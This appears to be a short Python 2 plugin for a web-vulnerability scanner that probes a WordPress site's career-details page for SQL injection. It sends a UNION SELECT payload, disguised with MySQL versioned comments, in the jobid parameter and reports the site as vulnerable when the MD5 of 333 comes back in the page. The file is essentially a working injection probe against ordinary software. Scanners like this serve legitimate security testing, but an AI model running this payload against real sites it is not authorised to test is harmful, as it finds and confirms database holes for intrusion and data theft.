#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
#http://neovante.com/
def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "career-details/?jobid=19+/*!12345UNION*/+/*!12345SELECT*/%201,md5(333),3,4%20--"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:wordpresssqlinjectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    #end try
    
    return list
#end def